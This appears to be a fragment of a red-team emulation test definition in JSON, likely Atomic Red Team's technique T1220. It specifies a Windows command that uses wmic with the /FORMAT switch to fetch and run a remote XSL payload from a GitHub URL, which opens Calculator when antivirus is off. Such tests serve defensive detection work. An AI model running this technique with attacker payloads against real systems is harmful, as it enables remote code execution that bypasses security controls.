                        "auto_generated_guid": "7f5be499-33be-4129-a560-66021f379b9b",
                        "description": "Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test successfully executed, while AV turned off.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "remote_xsl_file": {
                                "description": "Remote location of an XSL payload.",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"
                            },
                            "wmic_command": {
                                "description": "WMI command to execute using wmic.exe",
                                "type": "string",
                                "default": "process list"
                            }
                        },
                        "executor": {
                            "command": "wmic #{wmic_command} /FORMAT:\"#{remote_xsl_file}\"\n",
                            "name": "command_prompt"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 14:24:27"
}